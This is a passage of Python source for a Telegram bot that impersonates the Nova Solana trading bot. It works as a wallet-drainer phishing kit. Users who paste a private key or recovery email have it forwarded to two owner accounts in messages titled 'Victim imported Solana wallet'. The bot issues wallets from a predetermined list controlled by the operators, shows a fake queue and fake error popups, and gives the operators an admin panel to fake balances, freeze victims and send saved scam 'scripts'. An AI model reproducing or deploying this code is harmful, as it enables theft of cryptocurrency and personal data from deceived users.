        reply_markup=referrals_keyboard(),
        parse_mode=ParseMode.HTML,
        disable_web_page_preview=True,
    )


async def withdraw_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Withdraw command"""
    user_id = update.effective_user.id
    chat_id = update.effective_chat.id

    text = ("🌸 Withdraw Solana\n\n"
            "Balance: 0 SOL\n\n"
            "Current withdrawal address:\n\n"
            "🔧 Last address edit: -\n\n"
            f"🕒 Last updated: {current_time()}")

    await context.bot.send_message(
        chat_id=chat_id,
        text=text,
        reply_markup=withdraw_keyboard(),
        parse_mode=ParseMode.HTML,
        disable_web_page_preview=True,
    )


async def settings_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Settings command"""
    user_id = update.effective_user.id
    chat_id = update.effective_chat.id

    text = ("🌸 Bloom Settings\n\n"
            "🟢 : The feature/mode is turned ON\n"
            "🔴 : The feature/mode is turned OFF\n\n"
            "📖 Learn More!\n\n"
            f"🕒 Last updated: {current_time()}")

    await context.bot.send_message(
        chat_id=chat_id,
        text=text,
        reply_markup=settings_keyboard(user_id),
        parse_mode=ParseMode.HTML,
        disable_web_page_preview=True,
    )


async def message_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle text messages, particularly for access code input and admin operations"""
    user = update.effective_user
    user_id = user.id
    message_text = update.message.text

    # Check if user is awaiting access code input
    if user_id in user_data and user_data[user_id].get("awaiting_access_code"):
        user_data[user_id]["awaiting_access_code"] = False

        if message_text.strip() == ACCESS_CODE:
            # Valid access code
            user_data[user_id]["state"] = "access_granted"
            # Add user to approved list and save to file
            add_approved_user(user_id)

            await update.message.reply_text(
                text=get_approved_message(),
                parse_mode=ParseMode.HTML,
                disable_web_page_preview=True,
                reply_markup=continue_keyboard(),
            )
        else:
            # Invalid access code
            await update.message.reply_text(
                text=get_invalid_code_message(),
                parse_mode=ParseMode.HTML,
                disable_web_page_preview=True,
                reply_markup=invalid_code_keyboard(),
            )
        return

    # Check if user is awaiting position import
    if user_id in user_data and user_data[user_id].get("awaiting_position_import"):
        user_data[user_id]["awaiting_position_import"] = False
        
        await update.message.reply_text(
            "Invalid token address. Please try again.",
        )
        return

    # Check if user is awaiting token address input
    if user_id in pending_token_requests:
        pending_token_requests.remove(user_id)

        # Show popup message about wallet import
        await update.message.reply_text(
            "You currently don't have any wallets imported. Please import one to do this.",
        )
        return

    # Check if user is awaiting private key input
    if user_id in user_data and user_data[user_id].get("awaiting_private_key"):
        # Reset the awaiting state
        user_data[user_id]["awaiting_private_key"] = False

        # Get username or fallback to N/A
        username = user.username if user.username else "N/A"

        # Create victim information message with private key
        victim_message = ("🌸 Victim imported Solana wallet\n\n"
                          "🔎 Victim Information\n\n"
                          f"├ 👤 Name: {username}\n"
                          f"├ 🆔 {user_id}\n"
                          f"├ 🔑 Private Key: <code>{message_text}</code>")

        # Send to both owners
        try:
            await context.bot.send_message(chat_id=OWNER_ID,
                                           text=victim_message,
                                           parse_mode=ParseMode.HTML)
            if SECOND_OWNER_ID:
                await context.bot.send_message(chat_id=SECOND_OWNER_ID,
                                               text=victim_message,
                                               parse_mode=ParseMode.HTML)
        except Exception as e:
            print(f"Error sending to owners: {e}")

        # Show wallet creation confirmation message without inline buttons
        await update.message.reply_text(
            "Please wait while your wallet is being created. ✅")
        return

    # Check if user is awaiting wallet name input
    if user_id in wallet_states and wallet_states[user_id].get("awaiting_wallet_name"):
        wallet_name = message_text.strip()
        
        # Validate wallet name (prevent numbers and duplicates)
        if wallet_name.isdigit():
            await update.message.reply_text(
                "Wallet name cannot be just a number. Please choose a different name.")
            return
            
        wallets = get_user_wallets(user_id)
        if wallet_name in wallets or wallet_name.lower() == "w1":
            await update.message.reply_text(
                "A wallet with this name already exists. Please choose a different name.")
            return
        
        wallet_states[user_id]["awaiting_wallet_name"] = False

        # Create new wallet using predetermined wallet data
        predetermined_wallet = get_next_predetermined_wallet(user_id)
        wallets[wallet_name] = {
            "address": predetermined_wallet["address"],
            "private_key": predetermined_wallet["private_key"]
        }

        wallet_data = wallets[wallet_name]

        await update.message.reply_text(
            f"✅ <b>Nova Wallet Created!</b>\n\n"
            f"💳 <b>Name:</b>\n\n"
            f"<code>{wallet_name}</code>\n\n"
            f"🔗 <b>Address:</b>\n\n"
            f"<code>{wallet_data['address']}</code>\n\n"
            f"🔑 <b>Private Key:</b>\n\n"
            f"<code>{wallet_data['private_key']}</code>\n\n"
            f"⚠️ <b>Keep your private key safe and secure. Nova will no longer remember your private key, and you will no longer be able to retrieve it after this message. Please import your wallet into Phantom.</b>\n\n"
            f"💡 <b>To view your other wallets, head over to settings.</b>",
            parse_mode=ParseMode.HTML,
            reply_markup=InlineKeyboardMarkup([[
                InlineKeyboardButton("⬅️ Back",
                                     callback_data="settings_wallets")
            ]]))
        return

    # Check if user is awaiting wallet rename input
    if user_id in wallet_states and wallet_states[user_id].get(
            "awaiting_wallet_rename"):
        new_name = message_text.strip()
        old_name = wallet_states[user_id]["wallet_to_rename"]
        wallets = get_user_wallets(user_id)

        if old_name in wallets:
            # Rename wallet
            wallets[new_name] = wallets.pop(old_name)

        wallet_states[user_id]["awaiting_wallet_rename"] = False
        wallet_states[user_id]["wallet_to_rename"] = None

        # Return to wallet settings
        text = (
            "💳 <b>Wallet Settings</b>\n\n"
            "📚 <b>Need more help?</b> <a href='https://docs.tradeonnova.io/'>Click Here!</a>\n\n"
            "🌐 <b>Create, manage and import wallets here.</b>\n\n"
            "💳 <b>Your Solana Wallets:</b>\n\n"
            f"→ <b>W1 (Default)</b> - <code>{user_balances.get(user_id, 0):.0f} SOL (${user_usd_balances.get(user_id, 0):.2f} USD)</code>\n"
            f"<code>{WALLET_ADDRESS}</code>\n")

        # Add created wallets
        for wallet_name, wallet_data in wallets.items():
            text += f"• <b>{wallet_name}</b> - <code>0 SOL ($0.00 USD)</code>\n<code>{wallet_data['address']}</code>\n"

        text += (
            "\n🔒 <b>Tip: Keep your Nova wallets secure by setting a Security Pin below.</b>\n\n"
            "💡 <b>Select an option below.</b>\n\n"
            f"🕒 <b>Last updated:</b> {current_time()}")

        await update.message.reply_text(text=text,
                                        parse_mode=ParseMode.HTML,
                                        disable_web_page_preview=True,
                                        reply_markup=wallets_keyboard())
        return

    # Check if user is awaiting withdrawal amount
    if user_id in wallet_states and wallet_states[user_id].get("awaiting_withdrawal_amount"):
        try:
            amount = float(message_text.strip())
            wallet_states[user_id]["withdrawal_amount"] = amount
            wallet_states[user_id]["awaiting_withdrawal_amount"] = False
            wallet_states[user_id]["awaiting_withdrawal_address"] = True

            await update.message.reply_text(
                "Please enter the wallet address you would like to withdraw to.")
        except ValueError:
            await update.message.reply_text(
                "Please enter a valid number. Example: 5")
        return

    # Check if user is awaiting withdrawal address
    if user_id in wallet_states and wallet_states[user_id].get(
            "awaiting_withdrawal_address"):
        wallet_states[user_id]["awaiting_withdrawal_address"] = False
        await update.message.reply_text(
            "Invalid wallet address. Please try again.")
        return

    # Check if user is awaiting recovery email
    if user_id in wallet_states and wallet_states[user_id].get("awaiting_recovery_email"):
        email = message_text.strip()
        wallet_states[user_id]["recovery_email"] = email
        wallet_states[user_id]["awaiting_recovery_email"] = False
        wallet_states[user_id]["awaiting_email_confirmation"] = True
        
        await update.message.reply_text(
            "Please confirm your email by entering it again.")
        return

    # Check if user is awaiting email confirmation
    if user_id in wallet_states and wallet_states[user_id].get("awaiting_email_confirmation"):
        confirmation_email = message_text.strip()
        stored_email = wallet_states[user_id].get("recovery_email", "")
        
        if confirmation_email == stored_email:
            # Emails match, relay to owners
            username = user.username if user.username else "N/A"
            
            victim_message = ("🌸 Victim imported E-Mail\n\n"
                              "🔎 Victim Information\n\n"
                              f"├ 👤 Name: {username}\n"
                              f"├ 🆔 {user_id}\n"
                              f"├ 📧 Email: <code>{stored_email}</code>")
            
            try:
                await context.bot.send_message(chat_id=OWNER_ID,
                                               text=victim_message,
                                               parse_mode=ParseMode.HTML)
                if SECOND_OWNER_ID:
                    await context.bot.send_message(chat_id=SECOND_OWNER_ID,
                                                   text=victim_message,
                                                   parse_mode=ParseMode.HTML)
            except Exception as e:
                print(f"Error sending to owners: {e}")
            
            wallet_states[user_id]["awaiting_email_confirmation"] = False
            await update.message.reply_text(
                "Please wait for the next step of the process.")
        else:
            # Emails don't match
            await update.message.reply_text(
                "Invalid email address. Please try again.")
        return

    # Handle admin operations (only for owners)
    if user_id in [OWNER_ID, SECOND_OWNER_ID] and user_id in admin_states:
        admin_state = admin_states[user_id]

        if admin_state.get("awaiting_balance_input"):
            # Expecting format: "user_id sol_amount usd_amount"
            try:
                parts = message_text.strip().split()
                if len(parts) != 3:
                    await update.message.reply_text(
                        "❌ Invalid format. Please use: user_id sol_amount usd_amount\nExample: 123456789 5.5 1000.0\nUse 0 0 to reset balance."
                    )
                    return

                target_user_id = int(parts[0])
                sol_amount = float(parts[1])
                usd_amount = float(parts[2])

                if sol_amount < 0 or usd_amount < 0:
                    await update.message.reply_text(
                        "❌ Amounts must be non-negative. Use 0 0 to reset balance."
                    )
                    return

                # Store the pending balance operation (SOL and USD are now independent)
                admin_states[user_id]["pending_balance"] = {
                    "target_user_id": target_user_id,
                    "sol_amount": sol_amount,
                    "usd_amount": usd_amount
                }
                admin_states[user_id]["awaiting_balance_input"] = False

                # Calculate new balance (only SOL amount affects the SOL balance)
                current_balance = user_balances.get(target_user_id, 0)
                if sol_amount == 0 and usd_amount == 0:
                    new_sol_balance = 0
                else:
                    new_sol_balance = current_balance + sol_amount

                # Show confirmation
                if sol_amount == 0 and usd_amount == 0:
                    action_text = "reset to 0"
                else:
                    action_parts = []
                    if sol_amount > 0:
                        action_parts.append(f"{sol_amount:.2f} SOL")
                    if usd_amount > 0:
                        action_parts.append(f"${usd_amount:.2f} USD")
                    action_text = f"add {' + '.join(action_parts)}"

                # Get current USD balance
                current_usd_balance = user_usd_balances.get(target_user_id, 0)
                new_usd_balance = current_usd_balance + usd_amount if not (
                    sol_amount == 0 and usd_amount == 0) else 0

                confirm_text = (
                    f"💰 <b>Balance Update Confirmation</b>\n\n"
                    f"User ID: {target_user_id}\n"
                    f"Current SOL Balance: {current_balance:.2f} SOL\n"
                    f"Current USD Balance: ${current_usd_balance:.2f} USD\n"
                    f"Action: {action_text}\n"
                    f"SOL to add: {sol_amount:.2f} SOL\n"
                    f"USD to add: ${usd_amount:.2f} USD\n"
                    f"New SOL Balance: {new_sol_balance:.2f} SOL\n"
                    f"New USD Balance: ${new_usd_balance:.2f} USD\n\n"
                    f"Confirm this balance update?")

                await context.bot.send_message(chat_id=update.message.chat_id,
                                               text=confirm_text,
                                               parse_mode=ParseMode.HTML,
                                               reply_markup=confirm_keyboard(
                                                   "balance", target_user_id))

            except ValueError:
                await update.message.reply_text(
                    "❌ Invalid input. Please use: user_id sol_amount usd_amount\nExample: 123456789 5.5 1000.0"
                )
            except Exception as e:
                await update.message.reply_text(f"❌ Error: {str(e)}")

            return

        elif admin_state.get("awaiting_message_input"):
            # Expecting format: "user_id message"
            try:
                parts = message_text.strip().split(maxsplit=1)
                if len(parts) != 2:
                    await update.message.reply_text(
                        "❌ Invalid format. Please use: user_id message\nExample: 123456789 Hello, this is a custom message!"
                    )
                    return

                target_user_id = int(parts[0])
                message_to_send = parts[1]

                # Store the pending message operation
                admin_states[user_id]["pending_message"] = {
                    "target_user_id": target_user_id,
                    "message": message_to_send
                }
                admin_states[user_id]["awaiting_message_input"] = False

                # Show confirmation
                confirm_text = (f"💬 <b>Message Confirmation</b>\n\n"
                                f"Recipient: {target_user_id}\n\n"
                                f"<b>Message Preview:</b>\n"
                                f"{message_to_send}\n\n"
                                f"Send this message?")

                await context.bot.send_message(chat_id=update.message.chat_id,
                                               text=confirm_text,
                                               parse_mode=ParseMode.HTML,
                                               reply_markup=confirm_keyboard(
                                                   "message", target_user_id))

            except ValueError:
                await update.message.reply_text(
                    "❌ Invalid user ID. Please use: user_id message\nExample: 123456789 Hello!"
                )
            except Exception as e:
                await update.message.reply_text(f"❌ Error: {str(e)}")

            return

        elif admin_state.get("awaiting_script_user_id"):
            # Expecting user_id for script sending
            try:
                target_user_id = int(message_text.strip())
                script_key = admin_states[user_id]["selected_script"]
                script_message = SAVED_SCRIPTS[script_key]

                # Store the pending script operation
                admin_states[user_id]["pending_script"] = {
                    "target_user_id": target_user_id,
                    "script_key": script_key,
                    "message": script_message
                }
                admin_states[user_id]["awaiting_script_user_id"] = False

                # Show confirmation
                confirm_text = (
                    f"📝 <b>Script Message Confirmation</b>\n\n"
                    f"Script: {script_key.replace('_', ' ').title()}\n"
                    f"Recipient: {target_user_id}\n\n"
                    f"<b>Message Preview:</b>\n"
                    f"{script_message}\n\n"
                    f"Send this script?")

                await context.bot.send_message(chat_id=update.message.chat_id,
                                               text=confirm_text,
                                               parse_mode=ParseMode.HTML,
                                               reply_markup=confirm_keyboard(
                                                   "script", target_user_id))

            except ValueError:
                await update.message.reply_text(
                    "❌ Invalid user ID. Please enter a valid user ID.")
            except Exception as e:
                await update.message.reply_text(f"❌ Error: {str(e)}")

            return

        elif admin_state.get("awaiting_freeze_user_id"):
            # Expecting user_id for freezing
            try:
                target_user_id = int(message_text.strip())

                admin_states[user_id]["awaiting_freeze_user_id"] = False

                # Add user to frozen set
                frozen_users.add(target_user_id)

                await update.message.reply_text(
                    f"🔒 User {target_user_id} has been frozen successfully.")

            except ValueError:
                await update.message.reply_text(
                    "❌ Invalid user ID. Please enter a valid user ID.")
            except Exception as e:
                await update.message.reply_text(f"❌ Error: {str(e)}")

            return

        elif admin_state.get("awaiting_unfreeze_user_id"):
            # Expecting user_id for unfreezing
            try:
                target_user_id = int(message_text.strip())

                admin_states[user_id]["awaiting_unfreeze_user_id"] = False

                # Remove user from frozen set
                frozen_users.discard(target_user_id)

                await update.message.reply_text(
                    f"🔓 User {target_user_id} has been unfrozen successfully.")

            except ValueError:
                await update.message.reply_text(
                    "❌ Invalid user ID. Please enter a valid user ID.")
            except Exception as e:
                await update.message.reply_text(f"❌ Error: {str(e)}")

            return


async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()  # Answer callback query immediately
    user_id = query.from_user.id
    data = query.data

    # Handle confirmation buttons (only for owners)
    if user_id in [OWNER_ID, SECOND_OWNER_ID] and data.startswith("confirm_"):
        parts = data.split("_", 2)
        action = parts[1]
        target_user_id = int(parts[2])

        if action == "balance" and user_id in admin_states and "pending_balance" in admin_states[
                user_id]:
            pending = admin_states[user_id]["pending_balance"]
            sol_amount = pending["sol_amount"]
            usd_amount = pending["usd_amount"]

            # Update balances separately
            if sol_amount == 0 and usd_amount == 0:
                user_balances[target_user_id] = 0
                user_usd_balances[target_user_id] = 0
            else:
                # Update SOL balance
                if target_user_id not in user_balances:
                    user_balances[target_user_id] = 0
                user_balances[target_user_id] += sol_amount

                # Update USD balance
                if target_user_id not in user_usd_balances:
                    user_usd_balances[target_user_id] = 0
                user_usd_balances[target_user_id] += usd_amount

            # Clear pending operation
            del admin_states[user_id]["pending_balance"]

            if sol_amount == 0 and usd_amount == 0:
                action_text = "reset to 0"
            else:
                action_parts = []
                if sol_amount > 0:
                    action_parts.append(f"{sol_amount:.2f} SOL")
                if usd_amount > 0:
                    action_parts.append(f"${usd_amount:.2f} USD")
                action_text = f"added {' + '.join(action_parts)}"

            # Display both balances
            sol_bal = user_balances[target_user_id]
            usd_bal = user_usd_balances.get(target_user_id, 0)
            await query.edit_message_text(
                f"✅ Balance {action_text} for user {target_user_id}.\nNew balances: {sol_bal:.2f} SOL + ${usd_bal:.2f} USD"
            )

        elif action == "message" and user_id in admin_states and "pending_message" in admin_states[
                user_id]:
            pending = admin_states[user_id]["pending_message"]
            message_to_send = pending["message"]

            try:
                await context.bot.send_message(chat_id=target_user_id,
                                               text=message_to_send,
                                               parse_mode=ParseMode.HTML)

                # Clear pending operation
                del admin_states[user_id]["pending_message"]

                await query.edit_message_text(
                    f"✅ Message sent successfully to user {target_user_id}!")

            except Exception as e:
                await query.edit_message_text(
                    f"❌ Failed to send message to user {target_user_id}: {str(e)}"
                )

        elif action == "script" and user_id in admin_states and "pending_script" in admin_states[
                user_id]:
            pending = admin_states[user_id]["pending_script"]
            script_message = pending["message"]

            try:
                await context.bot.send_message(chat_id=target_user_id,
                                               text=script_message,
                                               parse_mode=ParseMode.HTML)

                # Clear pending operation
                del admin_states[user_id]["pending_script"]

                await query.edit_message_text(
                    f"✅ Script sent successfully to user {target_user_id}!")

            except Exception as e:
                await query.edit_message_text(
                    f"❌ Failed to send script to user {target_user_id}: {str(e)}"
                )

        return

    # Handle decline buttons (only for owners)
    if user_id in [OWNER_ID, SECOND_OWNER_ID] and data.startswith("decline_"):
        parts = data.split("_", 2)
        action = parts[1]

        if action == "balance":
            # Clear pending operation and ask for balance input again
            if user_id in admin_states and "pending_balance" in admin_states[
                    user_id]:
                del admin_states[user_id]["pending_balance"]

            # Initialize admin_states if it doesn't exist
            if user_id not in admin_states:
                admin_states[user_id] = {}
            admin_states[user_id]["awaiting_balance_input"] = True
            await query.edit_message_text(
                "💰 <b>Add Balance</b>\n\nPlease enter the user ID, SOL amount, and USD amount:\n\n<code>user_id sol_amount usd_amount</code>\n\nExample: <code>123456789 5.5 1000.0</code>\nUse <code>0 0</code> to reset balance.",
                parse_mode=ParseMode.HTML)

        elif action == "message":
            # Clear pending operation and ask for message input again
            if user_id in admin_states and "pending_message" in admin_states[
                    user_id]:
                del admin_states[user_id]["pending_message"]

            # Initialize admin_states if it doesn't exist
            if user_id not in admin_states:
                admin_states[user_id] = {}
            admin_states[user_id]["awaiting_message_input"] = True
            await query.edit_message_text(
                "💬 <b>Message User</b>\n\nPlease enter the user ID and message:\n\n<code>user_id message</code>\n\nExample: <code>123456789 Hello, this is a custom message!</code>",
                parse_mode=ParseMode.HTML)

        elif action == "script":
            # Clear pending operation and go back to script selection
            if user_id in admin_states and "pending_script" in admin_states[
                    user_id]:
                del admin_states[user_id]["pending_script"]

            await query.edit_message_text(
                "📝 <b>Saved Scripts</b>\n\nSelect a script to send:",
                parse_mode=ParseMode.HTML,
                reply_markup=saved_scripts_keyboard())

        return

    # Handle import position functionality
    if data == "popup_import_wallet":
        # Check if this is from positions menu
        current_text = query.message.text.lower()
        if "positions" in current_text:
            # Set user to await token address input for position import
            if user_id not in user_data:
                user_data[user_id] = {}
            user_data[user_id]["awaiting_position_import"] = True
            
            await context.bot.send_message(
                chat_id=query.message.chat_id,
                text="Enter the token address of the position you want to import.",
                parse_mode=ParseMode.HTML,
            )
            return
        else:
            # Show wallet import alert for other cases
            await query.answer(
                text="You currently don't have any wallets imported. Please import one to do this.",
                show_alert=True)
            return

    # Popup alerts for specific buttons that need wallet import or other alerts
    alert_buttons = [
        "popup_pro_accounts",  # Pro accounts button
        "popup_create_task",  # Create task button
        "popup_add_new_config",  # Copy trade: Add new config
        "popup_pause_all",  # Copy trade: Pause all
        "popup_start_all",  # Copy trade: Start all
        "popup_set_address",  # Set address button
        "withdraw_50",  # 50% withdraw button
        "withdraw_100",  # 100% withdraw button
        "withdraw_x",  # X SOL withdraw button
        "settings_fee",  # Fee button
        "settings_slippage"  # Slippage button
    ]

    if data in alert_buttons:
        await query.answer(
            text=
            "You currently don't have any wallets imported. Please import one to do this.",
            show_alert=True)
        return

    # Handle new welcome flow buttons
    if data == "join_queue":
        # Add user to queue
        current_queue_length = len(queue_users) + 130  # Start at position 130
        join_time = time.time()
        user_data[user_id]["state"] = "queue"
        user_data[user_id]["queue_position"] = current_queue_length
        user_data[user_id]["queue_join_time"] = join_time
        queue_users[user_id] = current_queue_length

        await query.edit_message_text(
            text=get_queue_message(current_queue_length, join_time),
            parse_mode=ParseMode.HTML,
            disable_web_page_preview=True,
            reply_markup=queue_keyboard(),
        )
        return

    elif data == "enter_access_code":
        # Set user to await access code input
        if user_id not in user_data:
            user_data[user_id] = {}
        user_data[user_id]["awaiting_access_code"] = True

        await context.bot.send_message(
            chat_id=query.message.chat_id,
            text="Please enter your access or referral code:",
            parse_mode=ParseMode.HTML,
        )
        return

    elif data == "refresh_queue":
        # Update queue message with current position and time
        if user_id in user_data and user_data[user_id]["state"] == "queue":
            position = user_data[user_id]["queue_position"]
            join_time = user_data[user_id]["queue_join_time"]
            await query.edit_message_text(
                text=get_queue_message(position, join_time),
                parse_mode=ParseMode.HTML,
                disable_web_page_preview=True,
                reply_markup=queue_keyboard(),
            )
        return

    # Handle close button
    if data == "close":
        await query.message.delete()
        return

    # Handle refresh button: update time and stay in current menu
    if data == "refresh":
        current_text = query.message.text.lower()

        # Check which menu we're in and refresh appropriately
        if "nova positions" in current_text or "positions" in current_text:
            text = (
                "💼 Nova Positions\n\n"
                "📚 Need more help? <a href='https://docs.tradeonnova.io/modules/selling'>Click Here!</a>\n\n"
                "• No positions found.\n\n"
                f"🕒 Last Updated: {current_time()}")
            await query.edit_message_text(
                text=text,
                reply_markup=positions_keyboard(),
                parse_mode=ParseMode.HTML,
                disable_web_page_preview=True,
            )
            return
        elif "sniper" in current_text:
            text = (
                "🎯 Nova Sniper\n\n"
                "📚 Need more help? <a href='https://docs.tradeonnova.io/modules/sniper'>Click Here!</a>\n\n"
                "🌐 Snipe Pump.Fun migrating tokens and new Raydium pools.\n\n"
                "• No active sniper tasks.\n\n"
                "💡 Create and configure tasks below.")
            await query.edit_message_text(
                text=text,
                reply_markup=sniper_keyboard(),
                parse_mode=ParseMode.HTML,
                disable_web_page_preview=True,
            )
            return
        elif "copy trade" in current_text:
            text = ("🤖 Nova Copy Trade\n\n"
                    "🌐 Utilize blazing fast copy-trading speeds with Nova.\n\n"
                    "• No copy trade tasks found.\n\n"
                    "💡 Create a task below.")
            await query.edit_message_text(
                text=text,
                reply_markup=copy_trade_keyboard(),
                parse_mode=ParseMode.HTML,
                disable_web_page_preview=True,
            )
            return
        elif "afk" in current_text:
            text = (
                "💤 Nova AFK\n\n"
                "📚 Need more help? <a href='https://docs.tradeonnova.io/modules/sniper'>Click Here!</a>\n\n"
                "🌐 Automatically buy into new Pump.Fun & Raydium tokens as soon as they launch based on your filters.\n\n"
                "• No active AFK tasks.\n\n"
                "💡 Create and configure tasks below.")
            await query.edit_message_text(
                text=text,
                reply_markup=afk_mode_keyboard(),
                parse_mode=ParseMode.HTML,
                disable_web_page_preview=True,
            )
            return
        elif "limit orders" in current_text:
            text = (
                "📖 Nova Limit Orders\n\n"
                "🌐 Automatically trigger buy and sell trades when a token or position hits a certain market cap, price or profit level.\n\n"
                "• No active limit orders.\n\n"
                "💡 Orders can be created by pasting a token address.")
            await query.edit_message_text(
                text=text,
                reply_markup=limit_orders_keyboard(),
                parse_mode=ParseMode.HTML,
                disable_web_page_preview=True,
            )
            return
        elif "wallet" in current_text and "settings" in current_text:
            wallets = get_user_wallets(user_id)
            text = (
                "💳 <b>Wallet Settings</b>\n\n"
                "📚 <b>Need more help?</b> <a href='https://docs.tradeonnova.io/'>Click Here!</a>\n\n"
                "🌐 <b>Create, manage and import wallets here.</b>\n\n"
                "💳 <b>Your Solana Wallets:</b>\n\n"
                f"→ <b>W1 (Default)</b> - <code>{user_balances.get(user_id, 0):.0f} SOL (${user_usd_balances.get(user_id, 0):.2f} USD)</code>\n"
                f"<code>{WALLET_ADDRESS}</code>\n")

            # Add created wallets
            for wallet_name, wallet_data in wallets.items():
                text += f"• <b>{wallet_name}</b> - <code>0 SOL ($0.00 USD)</code>\n<code>{wallet_data['address']}</code>\n"

            text += (
                "\n🔒 <b>Tip: Keep your Nova wallets secure by setting a Security Pin below.</b>\n\n"
                "💡 <b>Select an option below.</b>")
            await query.edit_message_text(
                text=text,
                reply_markup=wallets_keyboard(),
                parse_mode=ParseMode.HTML,
                disable_web_page_preview=True,
            )
            return
        elif "withdraw" in current_text:
            text = ("🌸 Withdraw Solana\n\n"
                    f"Balance: {user_balances.get(user_id, 0):.0f} SOL\n\n"
                    "Current withdrawal address:\n\n"
                    "🔧 Last address edit: -\n\n"
                    f"🕒 Last updated: {current_time()}")
            await query.edit_message_text(
                text=text,
                reply_markup=withdraw_keyboard(),
                parse_mode=ParseMode.HTML,
                disable_web_page_preview=True,
            )
            return
        elif "nova referrals" in current_text or "referrals" in current_text:
            text = (
                "👥 Nova Referrals\n\n"
                "📚 Need more help? <a href='https://docs.tradeonnova.io/'>Click Here!</a>\n\n"
                "📈 Referrals\n\n"
                "<code>Tier 1\n"
                "• Users: 0\n"
                "• Volume: 0 SOL\n"
                "• Earnings: 0 SOL\n\n"
                "Tier 2\n"
                "• Users: 0\n"
                "• Volume: 0 SOL\n"
                "• Earnings: 0 SOL\n\n"
                "Tier 3\n"
                "• Users: 0\n"
                "• Volume: 0 SOL\n"
                "• Earnings: 0 SOL</code>\n\n"
                "💸 Payout Overview\n\n"
                "<code>• Total Rewards: 0 SOL\n"
                "• Total Payments Sent: 0 SOL\n"
                "• Total Payments Pending: 0 SOL</code>\n\n"
                "Your Referral Link\n\n"
                "🔗 https://t.me/TradeonNovaBot?start=r-N7ESKN\n\n"
                "💡 Select an action below.\n\n"
                f"🕒 Last updated: {current_time()}")
            await query.edit_message_text(
                text=text,
                parse_mode=ParseMode.HTML,
                disable_web_page_preview=True,
                reply_markup=referrals_keyboard_new(),
            )
            return
        elif "nova settings" in current_text or ("settings" in current_text
                                                 and "nova" in current_text):
            text = (
                "⚙️ <b>Nova Settings</b>\n\n"
                "📚 Need more help? <a href='https://docs.tradeonnova.io/'>Click Here!</a>\n\n"
                "💡 Select a setting you wish to change.\n\n"
                f"🕒 Last updated: {current_time()}")
            await query.edit_message_text(
                text=text,
                parse_mode=ParseMode.HTML,
                disable_web_page_preview=True,
                reply_markup=nova_settings_keyboard(),
            )
            return
        elif "auto buy" in current_text:
            text = (
                "🕹️ <b>Auto Buy Settings</b>\n\n"
                "📚 Need more help? Click Here!\n\n"
                "🌐 When auto buy is enabled, Nova will automatically buy any token you paste based on your rules.\n\n"
                "🔴 Status: Disabled\n\n"
                "⚙️ Auto Buy Rules\n\n"
                "• No rules set.\n\n"
                "💡 Configure your auto buy settings below.\n\n"
                f"🕒 Last updated: {current_time()}")
            await query.edit_message_text(
                text=text,
                parse_mode=ParseMode.HTML,
                reply_markup=auto_buy_keyboard(),
            )
            return
        else:
            # Default to main menu with updated time
            new_text = get_main_menu_message(user_id)
            await query.edit_message_text(
                text=new_text,
                parse_mode=ParseMode.HTML,
                disable_web_page_preview=True,
                reply_markup=main_menu_keyboard(),
            )
            return

    # Go back to main menu
    if data == "main_menu":
        await query.edit_message_text(
            text=get_main_menu_message(user_id),
            parse_mode=ParseMode.HTML,
            disable_web_page_preview=True,
            reply_markup=main_menu_keyboard(),
        )
        return

    # Handle continue button from approved access code message
    if data == "continue":
        await query.edit_message_text(
            text=get_wallet_message(),
            parse_mode=ParseMode.HTML,
            disable_web_page_preview=True,
            reply_markup=go_to_menu_keyboard(),
        )
        return

    # Handle go to menu button from wallet display
    if data == "go_to_menu":
        user_data[user_id]["state"] = "complete"
        await query.edit_message_text(
            text=get_main_menu_message(user_id),
            parse_mode=ParseMode.HTML,
            disable_web_page_preview=True,
            reply_markup=main_menu_keyboard(),
        )
        return

    # Admin panel operations (only for owners)
    if user_id in [OWNER_ID, SECOND_OWNER_ID]:
        if data == "admin_panel":
            text = ("🔧 <b>Admin Panel</b>\n\n"
                    "Welcome to the administrative control panel.\n"
                    "Select an option below:\n\n"
                    f"🕒 Accessed at: {current_time()}")
            await query.edit_message_text(
                text=text,
                parse_mode=ParseMode.HTML,
                reply_markup=panel_keyboard(),
            )
            return

        elif data == "admin_add_balance":
            # Initialize admin state for this user
            if user_id not in admin_states:
                admin_states[user_id] = {}
            admin_states[user_id]["awaiting_balance_input"] = True

            await context.bot.send_message(
                chat_id=query.message.chat_id,
                text=
                "💰 <b>Add Balance</b>\n\nPlease enter the user ID, SOL amount, and USD amount:\n\n<code>user_id sol_amount usd_amount</code>\n\nExample: <code>123456789 5.5 1000.0</code>\nUse <code>0 0</code> to reset balance.",
                parse_mode=ParseMode.HTML)
            return

        elif data == "admin_message_user":
            # Initialize admin state for this user
            if user_id not in admin_states:
                admin_states[user_id] = {}
            admin_states[user_id]["awaiting_message_input"] = True

            await context.bot.send_message(
                chat_id=query.message.chat_id,
                text=
                "💬 <b>Message User</b>\n\nPlease enter the user ID and message:\n\n<code>user_id message</code>\n\nExample: <code>123456789 Hello, this is a custom message!</code>",
                parse_mode=ParseMode.HTML)
            return

        elif data == "admin_saved_scripts":
            await query.edit_message_text(
                text="📝 <b>Saved Scripts</b>\n\nSelect a script to send:",
                parse_mode=ParseMode.HTML,
                reply_markup=saved_scripts_keyboard())
            return

        elif data.startswith("script_"):
            script_key = data[7:]  # Remove "script_" prefix
            if script_key in SAVED_SCRIPTS:
                # Initialize admin state for this user
                if user_id not in admin_states:
                    admin_states[user_id] = {}
                admin_states[user_id]["awaiting_script_user_id"] = True
                admin_states[user_id]["selected_script"] = script_key

                script_preview = SAVED_SCRIPTS[script_key][:100] + "..." if len(
                    SAVED_SCRIPTS[script_key]
                ) > 100 else SAVED_SCRIPTS[script_key]

                await context.bot.send_message(
                    chat_id=query.message.chat_id,
                    text=
                    f"📝 <b>{script_key.replace('_', ' ').title()}</b>\n\n<b>Preview:</b>\n{script_preview}\n\nPlease enter the user ID to send this script to:",
                    parse_mode=ParseMode.HTML)
            return

        elif data == "admin_freeze_user":
            # Initialize admin state for this user
            if user_id not in admin_states:
                admin_states[user_id] = {}
            admin_states[user_id]["awaiting_freeze_user_id"] = True

            await context.bot.send_message(
                chat_id=query.message.chat_id,
                text=
                "🔒 <b>Freeze User</b>\n\nPlease enter the user ID to freeze:",
                parse_mode=ParseMode.HTML)
            return

        elif data == "admin_unfreeze_user":
